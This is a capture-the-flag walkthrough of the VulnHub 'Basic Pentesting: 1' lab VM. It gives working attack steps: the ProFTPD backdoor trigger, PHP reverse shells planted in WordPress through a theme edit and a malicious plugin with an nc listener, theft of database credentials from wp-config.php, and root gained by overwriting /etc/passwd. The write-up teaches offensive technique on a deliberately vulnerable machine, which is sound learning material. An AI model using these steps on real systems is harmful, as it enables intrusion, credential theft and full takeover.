# Basic Pentesting: 1
[VulnHub link](https://www.vulnhub.com/entry/basic-pentesting-1,216/)  
By Josiah Pierce  

* Note: On some occasions below, the IP address might not match because this machine was revisited after some time.

## Enumeration ##
* After the victim VM has been booted up, we are greeted with a login page that requests for the password of user `marlinspike`. We attempt a few common passwords such as `password` and `admin`, but we do not manage to login as expected.
* The IP address of the victim VM can be found by clicking the icon with 2 arrows pointing up and down respectively on the top right-hand corner of the login page, which is `10.0.2.4`. Thus, no nmap scans are needed.
![](/screenshots/basic-pentesting-1/Login.jpg)
* Alternatively, log in through the Guest Session, and then run `ifconfig` from the Terminal to obtain the victim's IP address.
* From our Kali VM, run `nmap -p- -A 10.0.2.4`, which means to scan all ports from 1 to 65535 (0 is excluded), and to enable OS detection, version detection (for the available services), script scanning, and traceroute:
![](/screenshots/basic-pentesting-1/scanAllPortsandServiceVersions.jpg)
* There are 3 ports that are open: 21 (ftp), 22 (ssh) and 80 (http). This means that we can gain entry to the victim VM either via the FTP, SSH or HTTP service. The respective versions of these services are also listed.
* We will explore 2 methods from here onwards to gain root access, through either the FTP or HTTP service. The former takes lesser time (i.e. simpler), and we can do it using Metasploit, or manually.

## Method 1 (FTP service - Metasploit) ##
* Searching `ProFTPD 1.3.3c` (which is the version of the FTP service) reveals that it has a [malicious backdoor that was added to the ProFTPD download archive](https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_133c_backdoor).
* Run `msfconsole`, then `search proFTPD` to find out if there is an available module that exploits the backdoor mentioned above:
![](/screenshots/basic-pentesting-1/msfconsoleProFTPD.jpg)
* Indeed there is such an available module, and we see that it is ranked as excellent as well.
* Run `use exploit/unix/ftp/proftpd_133c_backdoor` for us to use the module, and then `show options` to see that there are 2 parameters in the module: RHOST (value: empty) and RPORT (value: 21).
* Set RHOST to be our victim's IP address: `set RHOST 10.0.2.4`. RPORT 21 is correct since we are targeting the FTP service, hence it will not be modified.
* Run `show options` again to confirm that we have the correct parameters set:
![](/screenshots/basic-pentesting-1/backdoorOptions.jpg)
* Run `exploit`:
![](/screenshots/basic-pentesting-1/exploitRootFTP.jpg)
* And we are done! We have gained root access with a shell on the victim VM.

## Method 2 (FTP service - Manual) ##
* I did another run on this machine, this time without using Metasploit to exploit the backdoor vulnerability in the FTP service.
* The IP address of the victim machine during this run is `10.0.2.5`.
* On our Kali VM, open Terminal and run `telnet 10.0.2.5 21`. This establishes a connection to the FTP service of the victim VM.
* Enter `HELP ACIDBITCHEZ` and we are now `root` (execute `id;` to confirm, or run spawn an interactive TTY shell with our standard Python command from here)!
![](/screenshots/basic-pentesting-1/exploitRootFTPManual.jpg)
* The [Exploit-DB entry](https://www.exploit-db.com/exploits/15662) for this showed that if the string entered matched `ACIDBITCHEZ`, then the user is now `root`, and has a shell spawned as well.
![](/screenshots/basic-pentesting-1/exploitDBproftpd.jpg)
* We see that the surrounding code of the backdoor had several mentions of `help` - Theo did a great-up at explaining the source code analysis in [his write-up](https://blog.theo.com.tw/Writeups/VulnHub/VulnHub-Basic-Pentesting-1/).
* Comparing exploitation of the FTP service using Metasploit and the manual method now, the latter takes a shorter time (and is really easy), and enables us to learn much more about the exploit too.

## Method 3 (HTTP service) ##
* We will first have a go with the HTTP service, thus we visit `10.0.2.4` and find a web server running:
![](/screenshots/basic-pentesting-1/httpServicePage.jpg)
* Note: Viewing the page source reveals no additional information.
* Note: Some common files and pages which we tried such as /robots.txt, /admin, /login.php are invalid pages as well.
* Though the page said that "no content has been added yet", we will still run our tools to verify if this is really the case: run `dirbuster`, which tries to find hidden files and directories using a user-supplied wordlist.
* Put `http://10.0.2.4` into the `Target URL` of dirbuster. We will use a wordlist that is provided by dirbuster, which can be found in `/usr/share/dirbuster/wordlists`. We will use `directory-list-lowercase-2.3-small.txt` for a start. We can stick with the existing 10 threads.
![](/screenshots/basic-pentesting-1/dirbusterSettings.jpg)
* While waiting for dirbuster to do its job (it will take a minute or two), we will look at other areas, such as verifying that it is indeed the ssh service which is running at port 22: `ssh marlinspike@10.0.2.4 -p 22`. Since there is a response that requests for the password, we can confirm that it is indeed the case.
* Heading back to dirbuster, we find that there is a directory called `secret` that contains `wp-admin`, `wp-content`, `wp-includes`, etc.
![](/screenshots/basic-pentesting-1/dirbusterResults.jpg)
* With `10.0.2.4/secret`, we expect a WordPress page to load, which happens (page is titled "My secret blog"). Note: the page loads rather slowly (notice that there is the message "Looking up vtsec at the bottom bar of the browser") and the page contents are not loaded properly, i.e. positioning of the texts, icons are off, as if there was no CSS.
* Placing our mouse over some of the links, we find that the hyperlink domain is actually `vtcsec`. A very likely reason that the page was loading slowly is that the browser was trying to resolve vtcsec, but was unable to do so eventually.
* Next, we will add an entry (`10.0.2.4 vtcsec`) into the Hosts file in Kali: open (`vim /etc/hosts`) and edit the file, before saving it. What this means is that the IP address of vtcsec is determined by us to be 10.0.2.4, and any  accesses to vtcsec will access 10.0.2.4, instead of trying to find out its IP address from a DNS server.
![](/screenshots/basic-pentesting-1/hostsFileEntries.jpg)
* Note: We could also add other mappings such as `10.0.2.4 vtcsec.com`, just in case there might be cases where there is a `.com` domain extension for one of the hyperlinks in the WordPress page, though we have yet to see one so far.
* Note: I tried to navigate around the page and login without inserting the mapping into the Hosts file, while doing another run of this challenge, but this was challenging in itself because the links resolved to vtcsec as the domain. Even though I got to the login page and entered the admin set of credentials, pressing the `Log In` button meant that the credentials were being sent to an unknown domain, which got me nowhere.
* Reload `10.0.2.4/secret` and volia, we see that the page has been properly loaded. This is because the CSS was trying to pull from a domain that did not exist until we added the entries to the Hosts file.
* There is no interesting content on the site's post, so we head to the Login page of the WordPress site (/wp-login.php) and attempt to login using the username `admin` and a random password. Using a random password allows us to check if an account with the username admin exists. The error message from an invalid login, that "the password you entered for the username admin is incorrect" confirms so. This is a form of information leakage in my opinion on WordPress' part.
* Next, we attempt a quick guess with the password `admin` for the admin account, and access is granted. No kind of bruteforcing is required here.
* It is likely that we have administrative privileges since we can see the full WordPress panel on the left-hand side of the wp-admin page, and also from the fact that both the username and password spelt admin as well. To confirm that we have full access to the site, we check `Users`, and find that the user `admin` indeed has administrator privileges. Moreover, this was the only user on this WordPress platform.

### Reverse Shell - pentestmonkey php-reverse-shell.php Method ###
* Using [pentestmonkey's php-reverse-shell.php code](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), insert it into any part of the WordPress site.
* The easiest method for me was to use the Editor to edit the Theme's code, and the reverse shell connection will immediately be triggered. Here, the Theme file that I will be using is `functions.php`, which is second on the list after opening the Editor.
* Edit `$ip` and `$port` to be that of our Kali VM and an used port for the reverse shell respectively.
* Run `nc -lvnp 1234` on our Kali Terminal to catch the connection, and hit `Update File` on the Editor.
* We have now got our reverse shell (because the code was triggered when the functions.php file was executed after the updating):
![](/screenshots/basic-pentesting-1/reverseShell.jpg)

### Reverse Shell - Pre-made Plugin Method ###
* Head to the `Plugins` page and install `malicious-wordpress-plugin` by `wetw0rk` [(GitHub link)](https://github.com/wetw0rk/malicious-wordpress-plugin). Once it is installed on the WordPress site, a reverse shell is granted.
* Before beginning the installation of the plugin, we will first start up our listener by cloning and opening the Git repository from our Kali terminal, and execute `python wordpwn.py 10.0.2.15 4000 Y`. The format for the command is `wordpwn.py [LHOST] [LPORT] [HANDLER]`. The IP address is that of the Kali machine.
* The payload is then generated in the `malicious.zip` file (found in the same folder as the cloned repository). Once the reverse TCP handler (listener) is started on the Kali terminal, we can upload the payload as a plugin (`GotEm`) to the WordPress site (Plugins > Add New > Upload Plugin), and activate it.
* Head to the plugins editor and select the GotEm plugin. We see that there are two files, `malicious/QwertyRocks.php` and `malicious/wetw0rk_maybe.php`. There are only documentation codes (commented) in the former, and in the latter, we find that there is a really long string within a `base64_decode` and `eval` function.
* Next, run `vtcsec/secret/wp-content/plugins/malicous/wetw0rk_maybe.php` on our browser to get the victim web server to initiate a reverse shell connection to our Kali machine.
* Heading back to our Kali terminal, we see that a meterpreter session has been opened. Enter `shell`, and `whoami` to see that we are `www-data`. We have now successfully got ourselves into the web server.
![](/screenshots/basic-pentesting-1/pluginMeterpreterShell.jpg)
* Note: Gaining reverse shells through the web server normally yields a `www-data` account (given that it is an Apache2 web server), which is used by the web server for its operations.
* Note: Run `exit` afterwards to exit from the shell.

### MySQL Database Credentials ###
* From the reverse shell which we have gotten, we can go up 3 levels of directory to reach one that contains a number of `wp-` PHP files, and specifically we want to download the wp-config.php to the root folder (i.e. back to our Kali machine): `download wp-config.php`.
* Open up the config file from our Kali machine with a text editor, and we find that we have the MySQL database username `root` and password `arootmysqlpass`.
* Side-note: We can probably do a **privilege escalation** from here after logging in to the database, but this is not the focus here at this moment.

### Poking Around in the Web Server ###
* Next, we will use `unix-privesc-check` from `pentestmonkey` [(GitHub link)](https://github.com/pentestmonkey/unix-privesc-check) on the victim VM. This tool is a "shell script to check for simple privilege escalation vectors on Unix systems". Clone the repository to the Kali VM, and run `git checkout 1_x`. We are using this branch's single shell script instead of the method from the master branch.
* On our meterpreter session, cd to `/var/www/html`, which hosts the WordPress page. We will now upload the unix-privesc-check tool to the victim VM: `upload ../unix-privesc-check/unix-privesc-check`.
* Give executable permissions to the script via chmod after running `shell` (interesting, if we were to run `chmod +x unix-privesc-check` before running `shell`, the file ends up having no permissions at all), and then run `./unix-privesc-check standard > output.txt`. Wait for awhile for our results to be redirected to output.txt, and we exit from shell. Next, run `download output.txt`.
* Alternatively, we can choose to have the result's output to the terminal (and not to redirect the output of the script to an external file), though I find this to be somewhat messy.
* As we see from the instructions at the top of the output file, if there is no string "WARNING" in the file, the script did not find any problems. Our first result from finding WARNING is that `/etc/passwd` can be written by anyone (world write).
![](/screenshots/basic-pentesting-1/writeablePasswdFile.jpg)

### Privilege Escalation ###
* Run `download /etc/passwd` from our meterpreter session.
* The first line of /etc/passwd is `root:x:0:0:root:/root:/bin/bash`. We see an `x`, which is a holding place for root's "encrypted password". Traditionally, this field actually stored the user's encrypted password. Modern Unix systems store encrypted passwords in a separate file (the shadow password file) that can be accessed only by privileged users.
* However, we can overwrite the `x` with a hash of a known password.
* Note: Removing the x might seem like an obvious choice to make the root account accessible without any password. However, it does not work here (*find out why!*), and we will still be prompted for a password when we run `su`. Adding a new account with the encrypted password field being left blank or with an asterick character only does not work too.
* Run `openssl passwd -1 pass` (`pass` is our simple password here). `openssl passwd` computes the hash of our password typed at run-time in this case, e.g. `$1$H6IJSTRO$Fcs6RA7D6/wnJM6dK.GSV1` for `pass`. `-1` means the use of MD5 based BSD password algorithm 1.
* Alternatively, if you want to run the openssl command without letting your password be shown in plaintext on the terminal, as well as to confirm your password, run the same command without the last parameter being your password.
* Note: The hash of the password generated by openssl will differ with each run of the command.
* Replace the `x` with our hash value, save the file, and upload the file back to the victim VM: `upload passwd /etc/passwd`.
* Run `shell`, then `su`, but there is an error stating that su must be run from a terminal.
* Execute `python -c 'import pty; pty.spawn("/bin/bash")'` (or `/bin/sh`) to spawn a proper shell, then run `su`. Note: When called without arguments, su defaults to running an interactive shell as `root`.
* Enter our password created above (e.g. `pass`), and we have got root access!